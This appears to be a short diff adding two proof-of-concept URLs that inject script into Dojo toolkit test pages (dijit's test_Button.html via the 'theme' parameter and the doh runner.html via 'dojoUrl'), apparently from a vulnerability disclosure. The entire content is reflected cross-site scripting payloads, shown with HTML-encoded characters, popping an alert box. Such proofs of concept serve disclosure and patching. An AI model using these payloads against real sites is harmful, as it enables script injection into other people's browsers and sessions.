@@ -1,0 +1,2 @@
+http://www.example.com/dijit/tests/form/test_Button.html?theme=&quot;/&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;
+http://www.example.com/util/doh/runner.html?dojoUrl=&#039;/&gt;foo&lt;/script&gt;&lt;&#039;&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;
